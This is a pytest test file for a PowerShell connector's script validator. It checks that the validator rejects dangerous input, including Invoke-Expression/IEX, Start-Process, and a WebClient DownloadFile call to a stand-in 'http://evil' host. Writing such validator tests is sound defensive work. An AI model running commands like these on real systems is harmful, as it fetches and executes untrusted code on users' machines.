"""Tests for PowerShell connector."""
import pytest

from ADAM.connections.powershell import (
    PowerShellConnector,
    PowerShellError,
    validate_powershell_script,
)


def test_execute_simple():
    connector = PowerShellConnector()
    result = connector.execute("Get-Process | Select-Object -First 1 Name")
    assert result["exit_code"] == 0
    assert "Name" in result["stdout"]


def test_execute_blocked():
    connector = PowerShellConnector()
    with pytest.raises(PowerShellError):
        connector.execute("Read-Host 'prompt'")


def test_validate_empty_script():
    with pytest.raises(PowerShellError):
        validate_powershell_script("")


def test_validate_invoke_expression():
    with pytest.raises(PowerShellError):
        validate_powershell_script("Invoke-Expression whoami")


def test_validate_iex_alias():
    with pytest.raises(PowerShellError):
        validate_powershell_script("IEX whoami")


def test_validate_subexpression():
    with pytest.raises(PowerShellError):
        validate_powershell_script("$(Get-Process)")


def test_validate_start_process():
    with pytest.raises(PowerShellError):
        validate_powershell_script("Start-Process notepad.exe")


def test_validate_download_file():
    with pytest.raises(PowerShellError):
        validate_powershell_script("(New-Object System.Net.WebClient).DownloadFile('http://evil', 'bad')")


def test_validate_control_character():
    with pytest.raises(PowerShellError):
        validate_powershell_script("\x00Get-Process")


def test_validate_non_string():
    with pytest.raises(TypeError):
        validate_powershell_script(123)
